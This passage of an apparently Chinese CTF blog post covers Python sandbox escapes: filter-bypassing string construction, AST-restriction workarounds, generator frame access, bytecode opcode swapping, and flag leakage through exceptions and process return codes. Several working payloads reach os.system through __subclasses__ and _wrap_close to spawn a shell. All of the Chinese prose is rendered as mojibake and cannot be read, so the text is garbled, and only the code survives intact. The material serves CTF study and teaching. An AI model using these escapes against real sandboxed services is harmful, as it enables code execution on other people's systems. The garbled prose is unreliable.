&quot;1&quot;: str(len([str()])) æˆ– str(len([min]))
&quot;2&quot;: str(len([str(),str()])) æˆ– str(len([min,max]))
&#x27;A&#x27;: chr(len([min,min,min,min,min])*len([min,min,min,min,min,min,min,min,min,min,min,min,min]))</code></pre>

<p>å¦‚æœè¦ç”¨æ•°å­—æ¥æ„é€ å­—ç¬¦ä¸²ï¼Œé€šå¸¸éœ€è¦ç”¨åˆ° chr å‡½æ•°ï¼Œè™½ç„¶é¢˜ç›®çš„ builtins æ²¡æœ‰ç›´æ¥æä¾› chr å‡½æ•°ï¼Œä½†ä¹Ÿå¯ä»¥è‡ªå·±æ‰‹åŠ¨å®ç°ä¸€ä¸ª chrã€‚</p>
<p>å½“ç„¶ï¼Œé¢˜ç›® builtins å…è®¸ dict å’Œ listï¼Œå› æ­¤å¯ä»¥ç›´æ¥ç”¨è¿™ä¸¤ä¸ªå‡½æ•°ç›´æ¥æ„é€ å‡ºå­—ç¬¦ä¸²ï¼Œè¿™ç§æ–¹å¼åœ¨æˆ‘æ­¤å‰çš„åšå®¢ï¼š<a href="https://dummykitty.github.io/python/2023/05/30/pyjail-bypass-02-%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8F%98%E6%8D%A2%E7%BB%95%E8%BF%87.html#list--dict">pyjail bypass-02 ç»•è¿‡åŸºäºå­—ç¬¦ä¸²åŒ¹é…çš„è¿‡æ»¤</a> ä¸­æœ‰æåˆ°è¿‡ã€‚</p>
<p>åœ¨è¿™ä¸ª payload ä¸­ï¼Œéœ€è¦æ„é€ å‡º _wrap_closeã€systemã€bash</p>
<pre><code class="highlight plaintext">[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if x.__name__==&quot;_wrap_close&quot;][0][&quot;system&quot;](&quot;bash&quot;)</code></pre>

<p>é‚£ä¹ˆå°±å¯ä»¥é€šè¿‡ä¸‹é¢çš„æ–¹å¼è·å–åˆ°è¿™å‡ ä¸ªå­—ç¬¦ä¸²ï¼š</p>
<pre><code class="highlight plaintext">list(dict(system=[]))[0]            # system
list(dict(_wrap_close=[]))[0]       # _wrap_close
list(dict(bash=[]))[0]              # bash</code></pre>

<h4 id="ç»•è¿‡-ast-Subscript-è·å–åˆ—è¡¨-å­—å…¸å…ƒç´ "><a href="#ç»•è¿‡-ast-Subscript-è·å–åˆ—è¡¨-å­—å…¸å…ƒç´ " class="headerlink" title="ç»•è¿‡ ast.Subscript è·å–åˆ—è¡¨&#x2F;å­—å…¸å…ƒç´ "></a>ç»•è¿‡ ast.Subscript è·å–åˆ—è¡¨&#x2F;å­—å…¸å…ƒç´ </h4><p>é¢˜ç›®åŒæ—¶é™å®šäº† ast.Subscriptï¼Œå› æ­¤æ— æ³•ç›´æ¥ä½¿ç”¨ç´¢å¼•ã€‚ä½† BUILTINS ä¸­ç»™å‡ºäº† min å‡½æ•°ï¼Œè¯¥å‡½æ•°å¯ä»¥è·å–åˆ—è¡¨ä¸­æœ€å°çš„å…ƒç´ ï¼Œå½“åˆ—è¡¨ä¸­åªæœ‰ä¸€ä¸ªå…ƒç´ æ—¶ï¼Œå°±å¯ä»¥ç›´æ¥å–å€¼ã€‚</p>
<pre><code class="highlight plaintext">min(list(dict(system=[])))            # system
min(list(dict(_wrap_close=[])))       # _wrap_close
min(list(dict(bash=[])))              # bash</code></pre>

<p>å¦‚æœè¦è·å–å­—å…¸å…ƒç´ ï¼Œå¯ä»¥åˆ©ç”¨ get å‡½æ•°æ¥æ›¿ä»£ Subscriptã€‚ä¾‹å¦‚æˆ‘éœ€è¦åœ¨ globals å­—å…¸ä¸­è·å– key ä¸º system çš„å…ƒç´ ï¼Œå¯ä»¥é…åˆ match&#x2F;case æ¥è·å–ã€‚</p>
<pre><code class="highlight plaintext">match globals:
    case object(get=get_func):
        get_func(&quot;system&quot;)</code></pre>

<h4 id="ç»•è¿‡-ast-For-éå†åˆ—è¡¨"><a href="#ç»•è¿‡-ast-For-éå†åˆ—è¡¨" class="headerlink" title="ç»•è¿‡ ast.For éå†åˆ—è¡¨"></a>ç»•è¿‡ ast.For éå†åˆ—è¡¨</h4><p>åœ¨æ„é€ æœ€ç»ˆ payload ä¸­ï¼Œæˆ‘ä»¬è¿˜éœ€è¦åœ¨ <code>__subclasses__()</code>å¾—åˆ°çš„åˆ—è¡¨ä¸­è·å–åˆ° _wrap_close ç±»ã€‚</p>
<pre><code class="highlight plaintext">[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if x.__name__==&quot;_wrap_close&quot;][0][&quot;system&quot;](&quot;bash&quot;)</code></pre>

<p>å½“åˆ—è¡¨ä¸­ä¸åªæœ‰ä¸€ä¸ªå…ƒç´ ä¸”åˆ—è¡¨ä¸­çš„å…ƒç´ ä¹‹é—´æ— æ³•æ¯”è¾ƒæ—¶ï¼Œæ­£å¸¸æƒ…å†µä¸‹å¯ä»¥ä½¿ç”¨ for æ¥éå†å¹¶åˆ¤æ–­ï¼Œä½† ast.For è¢«é¢˜ç›®è¿‡æ»¤äº†ï¼Œæ­¤æ—¶å¯ä»¥ä½¿ç”¨ filterï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p>
<pre><code class="highlight plaintext">def filter_func(subclazzes_item):
    [ _wrap_close:=min(list(dict(_wrap_close=[])))]
    match subclazzes_item:
        case object(_ï¼¿name_ï¼¿=name):
            if name==_wrap_close:
                return subclazzes_item
[
    subclazzes_item:=min(filter(filter_func,subclazzes()))
]</code></pre>

<p>fitler ä¸­ä½¿ç”¨ match&#x2F;case å’Œ if æ¥è¿›è¡Œè¿‡æ»¤ã€‚</p>
<p>é™¤äº†ä½¿ç”¨ filter å‡½æ•°å¤–ï¼Œè¿˜å¯ä»¥ä½¿ç”¨<code> iter</code> å’Œ <code>next</code> å‡½æ•°æ¥éå†åˆ—è¡¨ï¼Œä½†é¢˜ç›® BUILTINS ä¸­æ²¡æœ‰ç»™å‡ºè¿™ä¸¤ä¸ªå‡½æ•°ã€‚</p>
<h4 id="ç»•è¿‡ast-GeneratorExpè·å–ç”Ÿæˆå™¨æ ˆå¸§"><a href="#ç»•è¿‡ast-GeneratorExpè·å–ç”Ÿæˆå™¨æ ˆå¸§" class="headerlink" title="ç»•è¿‡ast.GeneratorExpè·å–ç”Ÿæˆå™¨æ ˆå¸§"></a>ç»•è¿‡<code>ast.GeneratorExp</code>è·å–ç”Ÿæˆå™¨æ ˆå¸§</h4><p>æ€è·¯æ¥è‡ªäº [<a href="https://maplebacon.org/2024/02/dicectf2024-irs/">DiceCTF 2024] IRS</a></p>
<p>payload å¦‚ä¸‹ï¼Œä¸” AST ä¸­ä¸ä¼šå‡ºç° <code>ast.GeneratorExp</code>ã€‚</p>
<pre><code class="highlight plaintext">def f():
    global x, frame
    frame = x.gi_frame.f_back.f_back
    yield
x = f()
x.send(None)
print(frame)</code></pre>

<p>å¦‚ä½•ç†è§£è¿™æ®µä»£ç ï¼š</p>
<ol>
<li>é¦–å…ˆå£°æ˜äº†ä¸€ä¸ªç”Ÿæˆå™¨ fï¼Œ<ol>
<li>f å†…éƒ¨å£°æ˜äº†å…¨å±€å˜é‡ x å’Œ frameï¼Œæ„å‘³ç€ä¼šåœ¨å‡½æ•°å¤–éƒ¨å¯¹å…¶è¿›è¡Œæ“ä½œã€‚</li>
</ol>
</li>
<li>x &#x3D; f() ä¼šå®ä¾‹åŒ–ä¸€ä¸ªç”Ÿæˆå™¨ï¼Œä½†ç”±äºç”Ÿæˆå™¨çš„å»¶è¿ŸåŠ è½½ï¼Œæ­¤æ—¶ç”Ÿæˆå™¨ä¸ä¼šæ‰§è¡Œã€‚</li>
<li>x.send(None)ï¼šè¿™è¡Œä»£ç å¯åŠ¨äº†ç”Ÿæˆå™¨ï¼Œå¹¶è®©å®ƒæ‰§è¡Œåˆ°ç¬¬ä¸€ä¸ª yield è¯­å¥ã€‚</li>
</ol>
<p>æµ‹è¯•ä»£ç å¦‚ä¸‹ï¼š</p>
<pre><code class="highlight plaintext">import ast

flag = &quot;flag&#123;12345&#125;&quot;
code = &#x27;&#x27;&#x27;
def f():
    global x, frame
    frame = x.gi_frame.f_back.f_back
    yield
x = f()
x.send(None)
print(frame.f_globals)
&#x27;&#x27;&#x27;

print(ast.dump(ast.parse(code, mode=&#x27;exec&#x27;), indent=4))
root = ast.parse(code)
compiled_code = compile(code,&quot;&lt;sandbox&gt;&quot;, &quot;exec&quot;)
# åˆæ˜¯ä¸€æ®µä¸¥é˜²æ­»å®ˆçš„è¿‡æ»¤
exec(
    compiled_code,
    None,   # globalsï¼Œä¹Ÿå¯èƒ½æ˜¯å…¶ä»–å€¼
    None    # localsï¼Œä¹Ÿå¯èƒ½æ˜¯å…¶ä»–å€¼
)</code></pre>

<h3 id="OPcode"><a href="#OPcode" class="headerlink" title="OPcode"></a><code>OPcode</code></h3><p>è§è¿‡pickleçš„å¤§æ¦‚éƒ½çŸ¥é“OPcodeæ˜¯ä¸ªä»€ä¹ˆä¸œè¥¿</p>
<blockquote>
<p>opcodeåˆç§°ä¸ºæ“ä½œç ï¼Œæ˜¯å°†pythonæºä»£ç è¿›è¡Œç¼–è¯‘ä¹‹åçš„ç»“æœï¼Œpythonè™šæ‹Ÿæœºæ— æ³•ç›´æ¥æ‰§è¡Œhuman-readableçš„æºä»£ç ï¼Œå› æ­¤pythonç¼–è¯‘å™¨ç¬¬ä¸€æ­¥å…ˆå°†æºä»£ç è¿›è¡Œç¼–è¯‘ï¼Œä»¥æ­¤å¾—åˆ°opcodeã€‚ä¾‹å¦‚åœ¨æ‰§è¡Œpythonç¨‹åºæ—¶ä¸€èˆ¬ä¼šå…ˆç”Ÿæˆä¸€ä¸ªpycæ–‡ä»¶ï¼Œpycæ–‡ä»¶å°±æ˜¯ç¼–è¯‘åçš„ç»“æœï¼Œå…¶ä¸­å«æœ‰opcodeåºåˆ—ã€‚</p>
</blockquote>
<p>é‚£ä¹ˆå¦‚ä½•æŸ¥çœ‹ä¸€ä¸ªå‡½æ•°çš„opcodeå‘¢ï¼Œå†™ä¸ªä¾‹å­çœ‹çœ‹å…ˆ</p>
<pre><code class="highlight plaintext">import dis

code_str = &#x27;print(&quot;a&quot;)&#x27;
code = compile(code_str, &#x27;&lt;string&gt;&#x27;, &#x27;exec&#x27;)

dis.dis(code)

print(&quot;\nconsts: &quot;, code.co_consts)
print(&quot;names: &quot;, code.co_names)
print(&quot;code: &quot;, code.co_code.hex())</code></pre>

<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250704170021243.png" alt="image-20250704170021243"></p>
<h4 id="IMPORT-FROMã€LOAD-ATTR-ç›¸äº’æ›¿æ¢"><a href="#IMPORT-FROMã€LOAD-ATTR-ç›¸äº’æ›¿æ¢" class="headerlink" title="IMPORT_FROMã€LOAD_ATTR ç›¸äº’æ›¿æ¢"></a>IMPORT_FROMã€LOAD_ATTR ç›¸äº’æ›¿æ¢</h4><p>æ€è·¯æ¥è‡ªäº:</p>
<ul>
<li><a href="https://sekai.team/blog/lactf-2023/pycjail">LA CTF 2023 â€“ Pycjail  Project SEKAI</a></li>
<li><a href="https://kmh.zone/blog/2021/02/07/ti1337-plus-ce/#another-way-to-leak">TI-1337 Plus CE: Abusing CPython internals  kmhâ€™s blog</a></li>
</ul>
<p>LOAD_ATTR å¯ä»¥å’Œ IMPORT_FROM ç›´æ¥æ›¿æ¢ã€‚</p>
<h4 id="LOAD-NAME-LOAD-ATTR"><a href="#LOAD-NAME-LOAD-ATTR" class="headerlink" title="LOAD_NAME &amp; LOAD_ATTR"></a>LOAD_NAME &amp; LOAD_ATTR</h4><p>LOAD_ATTR æ˜¯ç”¨æ¥ä»å¯¹è±¡ä¸­è·å–å±æ€§çš„å­—èŠ‚ç æŒ‡ä»¤ã€‚å®ƒé€šå¸¸ç”¨äºä»ä¸€ä¸ªå·²ç»åŠ è½½åˆ°æ ˆä¸Šçš„å¯¹è±¡ï¼ˆå¦‚æ¨¡å—æˆ–ç±»å®ä¾‹ï¼‰ä¸­è·å–æŸä¸ªå±æ€§ã€‚</p>
<p>ä¾‹å¦‚å¯¼å…¥ os.system å‡½æ•°</p>
<pre><code class="highlight plaintext">import os
os.system</code></pre>

<p>å¯¹åº”çš„å­—èŠ‚ç å¦‚ä¸‹ï¼Œå…¶ä¸­æœ€ä¸ºå…³é”®çš„å°±æ˜¯ LOAD_NAME å’Œ LOAD_ATTRã€‚</p>
<pre><code class="highlight plaintext">  2           0 LOAD_CONST               0 (0)
              2 LOAD_CONST               1 (None)
              4 IMPORT_NAME              0 (os)
              6 STORE_NAME               0 (os)

  3           8 LOAD_NAME                0 (os)
             10 LOAD_ATTR                1 (system)
             12 POP_TOP
             14 LOAD_CONST               1 (None)
             16 RETURN_VALUE

consts:  (0, None)
names:  (&#x27;os&#x27;, &#x27;system&#x27;)
code:  640064016c005a0065006a01010064015300
6400 -&gt; LOAD_CONST, consts[0] -&gt; 0
6401 -&gt; LOAD_CONST, consts[1] -&gt; None
6c00 -&gt; IMPORT_NAME, names[0] -&gt; os
5a00 -&gt; STORE_NAME, names[0] -&gt; os
6500 -&gt; LOAD_NAME, names[0] -&gt; os
6a01 -&gt; LOAD_ATTR, names[1] -&gt; system
0100 -&gt; POP_TOP
6401 -&gt; LOAD_CONST, consts[1] -&gt; None
5300 -&gt; RETURN_VALUE</code></pre>

<h4 id="IMPORT-NAME-IMPORT-FROM"><a href="#IMPORT-NAME-IMPORT-FROM" class="headerlink" title="IMPORT_NAME &amp; IMPORT_FROM"></a>IMPORT_NAME &amp; IMPORT_FROM</h4><p>å¦‚æœä½¿ç”¨ from æ¥è¿›è¡Œå‡½æ•°å¯¼å…¥:</p>
<pre><code class="highlight plaintext">from os import sys</code></pre>

<p>å¾—åˆ°çš„å­—èŠ‚ç ä¿¡æ¯å¦‚ä¸‹ï¼Œå¯ä»¥çœ‹åˆ°ä½¿ç”¨çš„æ˜¯ IMPORT_NAME å’Œ IMPORT_FROM ç»„åˆ</p>
<pre><code class="highlight plaintext">  2           0 LOAD_CONST               0 (0)
              2 LOAD_CONST               1 ((&#x27;system&#x27;,))
              4 IMPORT_NAME              0 (os)
              6 IMPORT_FROM              1 (system)
              8 STORE_NAME               1 (system)
             10 POP_TOP
             12 LOAD_CONST               2 (None)
             14 RETURN_VALUE

consts:  (0, (&#x27;system&#x27;,), None)
names:  (&#x27;os&#x27;, &#x27;system&#x27;)
code:  640064016c006d015a01010064025300
6400 -&gt; LOAD_CONST, consts[0] -&gt; 0
6401 -&gt; LOAD_CONST, consts[1] -&gt; (&#x27;system&#x27;,)
6c00 -&gt; IMPORT_NAME, names[0] -&gt; os
6d01 -&gt; IMPORT_FROM, names[1] -&gt; system
5a01 -&gt; STORE_NAME, arg -&gt; 1
0100 -&gt; POP_TOP
6402 -&gt; LOAD_CONST, consts[2] -&gt; None
5300 -&gt; RETURN_VALUE</code></pre>

<h4 id="æ›¿æ¢å­—èŠ‚ç "><a href="#æ›¿æ¢å­—èŠ‚ç " class="headerlink" title="æ›¿æ¢å­—èŠ‚ç "></a>æ›¿æ¢å­—èŠ‚ç </h4><p>åœ¨ LACTF 2023 Pycjail è¿™é“é¢˜çš„åœºæ™¯ä¸­ï¼Œç”¨æˆ·è¾“å…¥çš„ constã€namesã€code æœ€ç»ˆä¼šæ›¿æ¢åˆ°é¢˜ç›®ä¸­çš„ä¸€ä¸ªç©ºå‡½æ•°ä¸­å¹¶æ‰§è¡Œã€‚æ’é™¤æ‰é¢˜ç›®å…¶ä»–çš„è¿‡æ»¤ï¼Œå¤§è‡´çš„é€»è¾‘å¦‚ä¸‹ï¼š</p>
<ol>
<li>å¡«å…… f å‡½æ•° co_constsã€co_namesã€co_code</li>
<li>ç„¶åæ‰§è¡Œå‡½æ•°ã€‚</li>
</ol>
<p>æµ‹è¯•ä»£ç å¦‚ä¸‹ï¼š</p>
<pre><code class="highlight plaintext">def f():
    pass

f.__code__ = f.__code__.replace(
    co_stacksize=10,
    co_consts=(&quot;a&quot;, 139, &quot;system&quot;, &quot;dir&quot;),
    co_names=tuple(&quot;__class__,__base__,__subclasses__,__init__,__globals__&quot;.split(&quot;,&quot;)),
    co_code=bytes.fromhex(trans_bytes(&quot;64006a006a01a002a100640119006a036a046402190064038301010064045300&quot;)),
)


print(&quot;here goes!&quot;)
frame = inspect.currentframe()
p = print
r = repr
for k in list(frame.f_globals):
    if k not in (&quot;p&quot;, &quot;r&quot;, &quot;f&quot;):
        del frame.f_globals[k]

p(r(f()))</code></pre>

<p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä¸‹é¢çš„è„šæœ¬æ¥ç”Ÿæˆ payloadï¼Œæˆ‘æœ¬åœ°çš„ <code>_wrap_close</code> çš„ç´¢å¼•ä¸º 139.</p>
<pre><code class="highlight plaintext">import dis
import inspect
from test_opcode_display import display_opcode_py310
code_str = &#x27;&#x27;&#x27;
&#x27;a&#x27;.__class__.__base__.__subclasses__()[139].__init__.__globals__[&#x27;system&#x27;](&#x27;dir&#x27;)
&#x27;&#x27;&#x27;

code = compile(code_str, &#x27;&lt;string&gt;&#x27;, &#x27;exec&#x27;)

dis.dis(code)

print(&quot;\nconsts: &quot;, code.co_consts)
print(&quot;names: &quot;, code.co_names)
print(&quot;code: &quot;, code.co_code.hex())

# 64006d006d01a002a100640119006d036d046402190064038301010064045300</code></pre>

<p>LOAD_ATTR å¯¹åº”æ“ä½œç  6aï¼ŒIMPORT_FROM å¯¹åº”å­—èŠ‚ç ä¸º 6dï¼Œå½“æˆ‘å°† 6a ç›´æ¥æ›¿æ¢ä¸º 6d æ—¶ï¼Œå±…ç„¶èƒ½å¤Ÿæ­£å¸¸æ‰§è¡Œï¼</p>
<h3 id="æ— å›æ˜¾"><a href="#æ— å›æ˜¾" class="headerlink" title="æ— å›æ˜¾"></a>æ— å›æ˜¾</h3><p>åœ¨ Python ä¸­ä½¿ç”¨ exec å‡½æ•°æ‰§è¡Œä»£ç æ—¶ï¼Œé»˜è®¤æƒ…å†µä¸‹æ²¡æœ‰è¾“å‡ºï¼Œå¦‚æœæƒ³è¦å† exec ä¸­æ‰“å°ç»“æœï¼Œå°±éœ€è¦åœ¨æ‰§è¡Œä»£ç å—æ—¶å‡å¦‚ printã€‚</p>
<p>ä»¥<code> AmateursCTF</code> 2023 çš„ä¸€é“é¢˜ç›®ä¸ºä¾‹ï¼Œé¢˜ç›®çš„æºç å¦‚ä¸‹ï¼š</p>
<pre><code class="highlight plaintext">#!/usr/local/bin/python
from flag import flag

for _ in [flag]:
    while True:
        try:
            code = ascii(input(&quot;Give code: &quot;))
            if &quot;flag&quot; in code or &quot;e&quot; in code or &quot;t&quot; in code or &quot;\\&quot; in code:
                raise ValueError(&quot;invalid input&quot;)
            exec(eval(code))
        except Exception as err:
            print(err)</code></pre>

<p>åœ¨è¿™é“é¢˜ä¸­ï¼Œé¦–å…ˆé€šè¿‡ ascii å°†è¾“å…¥è¿›è¡Œè½¬åŒ–ï¼Œä½¿ç”¨ ascii åï¼Œå³ä½¿ unicodeï¼Œä¹Ÿä¼šè¢«è½¬åŒ–ä¸º \u00xx çš„å½¢å¼ã€‚ç„¶ååˆ¤æ–­è¾“å…¥ä¸­æ˜¯å¦å‡ºç°äº† flagã€eã€tã€ä»¥åŠ \ã€‚è¿™æ ·çš„è¿‡æ»¤æ¡ä»¶åŸºæœ¬å°† unicode ç»•è¿‡çš„æ–¹å¼ç»™é™åˆ¶ä½äº†ã€‚è¿‡æ»¤äº† e å’Œ tï¼Œ printã€help ç­‰è¾“å‡ºå‡½æ•°ä¹Ÿä¼šè¢«è¿‡æ»¤ï¼Œ è€Œé¢˜ç›®ä½¿ç”¨ exec æ¥æ‰§è¡Œ python ä»£ç ï¼Œå› æ­¤é™¤äº†ç»•è¿‡è¿‡æ»¤ä¹‹å¤–ï¼Œè¿˜éœ€è¦è€ƒè™‘å¦‚ä½•è·å–è¾“å‡ºã€‚</p>
<p>æ³¨æ„åˆ°è¿™é“é¢˜æ·»åŠ äº†ä¸€ä¸ªå¼‚å¸¸å¤„ç†ï¼Œå¦‚æœ exec ä¸­å‡ºç°é”™è¯¯ï¼Œåˆ™ä¼šå°†é”™è¯¯ä¿¡æ¯æ‰“å°å‡ºæ¥ï¼Œå€ŸåŠ©å¼‚å¸¸å¤„ç†çš„è¾“å‡ºï¼Œå°±å¯ä»¥å°† Python ä¸­çš„ä¸€äº›å†…éƒ¨å˜é‡ç»™å¸¦å‡ºæ¥ã€‚</p>
<h4 id="åˆ©ç”¨å¼‚å¸¸å¤„ç†"><a href="#åˆ©ç”¨å¼‚å¸¸å¤„ç†" class="headerlink" title="åˆ©ç”¨å¼‚å¸¸å¤„ç†"></a>åˆ©ç”¨å¼‚å¸¸å¤„ç†</h4><p>ä½œä¸ºå®¢æˆ·ç«¯è¾“å…¥ï¼Œç»“åˆå½“å‰è¯»å–å˜é‡çš„åœºæ™¯ï¼Œpython ä¸­å¯åˆ©ç”¨çš„ä¸€äº›å¼‚å¸¸å¤§å¤šä¸ºï¼š</p>
<ul>
<li><code>KeyError</code>ï¼ˆé”®é”™è¯¯ï¼‰ï¼š å½“è®¿é—®å­—å…¸ä¸­ä¸å­˜åœ¨çš„é”®æ—¶å¼•å‘çš„é”™è¯¯ã€‚ï¼ˆç”¨æˆ·è¾“å…¥çš„é”®åè¢«åº”ç”¨ä½¿ç”¨ï¼‰</li>
<li><code>FileNotFoundError</code>ï¼ˆæ–‡ä»¶æœªæ‰¾åˆ°é”™è¯¯ï¼‰ï¼š åœ¨å°è¯•æ‰“å¼€ä¸å­˜åœ¨çš„æ–‡ä»¶æ—¶å¼•å‘çš„é”™è¯¯ã€‚</li>
<li><code>ValueError</code>ï¼ˆå€¼é”™è¯¯ï¼‰ï¼š å½“å‡½æ•°æ¥æ”¶åˆ°æ­£ç¡®ç±»å‹çš„å‚æ•°ï¼Œä½†å‚æ•°å€¼ä¸åˆé€‚æ—¶å¼•å‘çš„é”™è¯¯ã€‚</li>
</ul>
<p>è¿™é“é¢˜ä¸­ _ ä¸ flag çš„å€¼ä¸€è‡´ï¼Œå› æ­¤æˆ‘ä»¬åªéœ€è¦è·å–å˜é‡ _ å°±å¯ä»¥è·å– flagã€‚</p>
<h5 id="KeyError"><a href="#KeyError" class="headerlink" title="KeyError"></a><code>KeyError</code></h5><p><code>KeyError</code> å‡ºç°åœ¨è®¿é—®å­—å…¸ä¸­ä¸å­˜åœ¨çš„é”®ï¼Œåˆ©ç”¨æ—¶ï¼Œå¯ä»¥éšä¾¿æ„é€ ä¸€ä¸ªå­—å…¸ï¼Œç„¶åä»¥éœ€è¦è¯»å–çš„å˜é‡ä½œä¸ºé”®åä¼ è¿›å»ã€‚æ¯”å¦‚åœ¨è¿™é“é¢˜ä¸­è¾“å…¥ï¼š</p>
<pre><code class="highlight plaintext">Give code: &#123;&quot;1&quot;:&quot;2&quot;&#125;[_]
&#x27;flag&#123;xxxx&#125;&#x27;</code></pre>

<h5 id="FileNotFoundError"><a href="#FileNotFoundError" class="headerlink" title="FileNotFoundError"></a>FileNotFoundError</h5><p><code>FileNotFoundError </code>å‡ºç°åœ¨æ‰¾ä¸åˆ°æŒ‡å®šæ–‡ä»¶æ—¶ï¼Œå°†éœ€è¦è¯»å–çš„å˜é‡åä¼ å…¥æ–‡ä»¶æ“ä½œå‡½æ•°å°±å¯ä»¥è§¦å‘å¼‚å¸¸ã€‚ä¾‹å¦‚ file(python2)ã€open ç­‰ã€‚</p>
<p>ä½†ç”±äºé¢˜ç›®è¿‡æ»¤äº† eï¼Œè¿™äº›å‡½æ•°éƒ½æ— æ³•ä½¿ç”¨ï¼Œå¦‚æœéœ€è¦æµ‹è¯•çš„è¯å¯ä»¥å°†è¿‡æ»¤çš„è¯­å¥åˆ é™¤æ‰ã€‚</p>
<pre><code class="highlight plaintext">Give code: open(_)
[Errno 2] No such file or directory: &#x27;flag&#123;xxxx&#125;&#x27;</code></pre>

<h5 id="ValueError"><a href="#ValueError" class="headerlink" title="ValueError"></a>ValueError</h5><p><code>ValueError </code>æ¯”è¾ƒå¥½åˆ©ç”¨ï¼Œåªéœ€è¦å°†éœ€è¦è¯»å–çš„å˜é‡ï¼Œä¼ å…¥ä¸€ä¸ªå‡½æ•°ï¼Œè¯¥å‡½æ•°çš„å‚æ•°ç±»å‹ä¸è¿™ä¸ªè¦è¯»å–çš„å˜é‡ä¸ä¸€è‡´å³å¯ï¼Œä¾‹å¦‚ï¼š</p>
<pre><code class="highlight plaintext">Give code: int(_)
ValueError: invalid literal for int() with base 10: &#x27;flag&#123;xxxx&#125;&#x27;</code></pre>

<p>å½“ç„¶è¿™é‡Œè¿‡æ»¤äº† tï¼Œint å‡½æ•°æ— æ³•ä½¿ç”¨ï¼Œå¯ä»¥å»å¯»æ‰¾ä¸€äº›åˆ«çš„å‡½æ•°ã€‚</p>
<h5 id="Popen-returncode"><a href="#Popen-returncode" class="headerlink" title="Popen.returncode"></a>Popen.returncode</h5><p>åœ¨ aliyunCTF 2025 ezoj è¿™é“é¢˜ä¸­ï¼Œç»™å‡ºäº†ä¸€ä¸ªä½¿ç”¨ subprocess.Popen æ‰§è¡Œ python è„šæœ¬ï¼Œä½†æ— å›æ˜¾çš„æƒ…å†µï¼Œ</p>
<pre><code class="highlight plaintext">process = subprocess.Popen(
    [&quot;python3&quot;, code_filename],
    stdin=infile,
    stdout=subprocess.PIPE,
    stderr=subprocess.PIPE,
    text=True,
)

try:
    stdout, stderr = process.communicate(timeout=5)
except subprocess.TimeoutExpired:
    process.kill()
    raise OJTimeLimitExceed

if process.returncode != 0:
    raise OJRuntimeError(process.returncode)</code></pre>

<p>ä½†æ˜¯é¢˜ç›®ç»™äº†ä¸€ä¸ª OJRuntimeErrorï¼Œå¹¶ä¸”ä¼ å…¥äº† returncode å±æ€§ã€‚returncode å±æ€§ç”¨äºä¿å­˜å­è¿›ç¨‹é€€å‡ºæ—¶è¿”å›çš„é€€å‡ºç ï¼Œåæ˜ äº†å­è¿›ç¨‹æ˜¯åœ¨æ­£å¸¸ç»“æŸè¿˜æ˜¯åœ¨è¿è¡Œè¿‡ç¨‹ä¸­å‡ºç°å¼‚å¸¸ã€‚</p>
<p>è¿™é“é¢˜ä¼šå°†é”™è¯¯ç å‘é€ç»™å®¢æˆ·ç«¯ï¼š</p>
<pre><code class="highlight plaintext">except OJRuntimeError as e:
    return &#123;&quot;status&quot;: &quot;RE&quot;, &quot;message&quot;: f&quot;Runtime Error: ret=&#123;e.args[0]&#125;&quot;&#125;</code></pre>

<p><code>returncode</code> çš„å¯èƒ½å–å€¼æœ‰ä»¥ä¸‹å‡ ç§</p>
<ul>
<li>Noneï¼šè¡¨ç¤ºå­è¿›ç¨‹å°šæœªç»ˆæ­¢ï¼Œæ­¤æ—¶ returncode è¿˜æ²¡æœ‰è¢«èµ‹å€¼ã€‚</li>
<li>0ï¼šè¡¨ç¤ºå­è¿›ç¨‹æˆåŠŸç»“æŸï¼Œæ²¡æœ‰å‘ç”Ÿé”™è¯¯ã€‚</li>
<li>æ­£æ•´æ•°ï¼šè¡¨ç¤ºå­è¿›ç¨‹æ‰§è¡Œæ—¶å‡ºç°äº†é”™è¯¯ï¼Œè¿”å›ç é€šå¸¸ä¼šåæ˜ é”™è¯¯ç±»å‹æˆ–çŠ¶æ€ç ã€‚</li>
<li>è´Ÿæ•´æ•°ï¼šï¼ˆä»…åœ¨ POSIX ç³»ç»Ÿä¸­ï¼‰è¡¨ç¤ºå­è¿›ç¨‹è¢«æŸä¸ªä¿¡å·å¼ºåˆ¶ç»ˆæ­¢ï¼Œå…¶æ•°å€¼é€šå¸¸ä¸º -Nï¼Œå…¶ä¸­ N æ˜¯å¼•èµ·ç»ˆæ­¢çš„ä¿¡å·ç¼–å·ã€‚</li>
</ul>
<p>ç”±äº ascii ä¹Ÿæ˜¯ 0-255ï¼Œå€ŸåŠ©è¿™ä¸ª returncode å°±å¯ä»¥å®ç°å›æ˜¾ï¼Œä½† returncode ä»…æœ‰ä¸€ä½ï¼Œæ‰€ä»¥éœ€è¦é€ä½å›æ˜¾ã€‚</p>
<pre><code class="highlight plaintext">import sys
...

content_len = len(content)
if &#123;loc&#125; &lt; content_len:
    sys.exit(content[&#123;loc&#125;])
else:
    sys.exit(255)</code></pre>

<h3 id="é’©å­çˆ¹æ¥å’¯"><a href="#é’©å­çˆ¹æ¥å’¯" class="headerlink" title="é’©å­çˆ¹æ¥å’¯!"></a>é’©å­çˆ¹æ¥å’¯!</h3><p>é’©å­æ˜¯ä»€ä¹ˆ?<del>é’©å­å°±æ˜¯é’©å­å•Š</del></p>
<blockquote>
<p> <strong>Audit Hook</strong>å®¡è®¡é’©å­æ˜¯Python3.8å¼€å§‹å¼•å…¥çš„ä¸€é¡¹å®‰å…¨åŠŸèƒ½æ—¨åœ¨è®© Python è¿è¡Œæ—¶çš„æ“ä½œå¯¹å¤–éƒ¨ç›‘æ§å·¥å…·å¯è§ã€‚è¯¥åŠŸèƒ½å…è®¸å¼€å‘è€…é€šè¿‡æ³¨å†Œé’©å­å‡½æ•°æ¥ç›‘æ§å’Œæ§åˆ¶ç‰¹å®šçš„äº‹ä»¶ï¼Œå°¤å…¶æ˜¯ä¸å®‰å…¨ç›¸å…³çš„æ“ä½œã€‚è¿™ç§æœºåˆ¶ä¸ºç³»ç»Ÿç®¡ç†å‘˜ã€æµ‹è¯•äººå‘˜å’Œå®‰å…¨ä¸“å®¶æä¾›äº†ä¸€ä¸ªæœ‰æ•ˆçš„æ‰‹æ®µæ¥æ£€æµ‹ã€è®°å½•æˆ–é˜»æ­¢ç‰¹å®šæ“ä½œã€‚</p>
